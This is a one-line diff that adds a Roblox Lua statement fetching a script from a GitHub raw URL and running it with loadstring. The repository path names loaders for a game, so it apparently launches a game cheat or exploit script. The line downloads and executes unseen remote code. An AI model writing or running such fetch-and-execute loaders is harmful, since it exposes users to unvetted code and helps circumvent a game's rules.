@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/upd-2-build-a-pc-spam7-q9xx3x71o7gv1h.lua"))()
